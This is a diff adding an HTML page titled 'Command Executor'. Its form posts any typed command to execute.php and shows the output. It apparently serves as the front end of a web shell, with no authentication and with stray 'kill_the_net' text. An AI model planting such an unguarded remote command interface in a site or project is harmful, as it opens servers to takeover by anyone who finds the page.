@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Executor</title>
+    <style>
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        #output {
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-top: 10px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+    kill_the_net
+    <form id="commandForm">
+        <input type="text" id="commandInput" placeholder="Enter command" required>
+        <button type="submit">Execute</button>
+    </form>
+    <div id="output"></div>
+
+    <script type="text/javascript">
+        document.getElementById('commandForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const command = document.getElementById('commandInput').value;
+            const outputDiv = document.getElementById('output');
+
+            // Clear previous output
+            outputDiv.textContent = 'Executing command...';
+
+            // Send AJAX request
+            fetch('execute.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'command=' + encodeURIComponent(command)
+            })
+            .then(response => response.text())
+            .then(data => {
+                outputDiv.textContent = data;
+            })
+            .catch(error => {
+                outputDiv.textContent = 'An error occurred: ' + error.message;
+            });
+        });
+    </script>
+</body>
+</html>
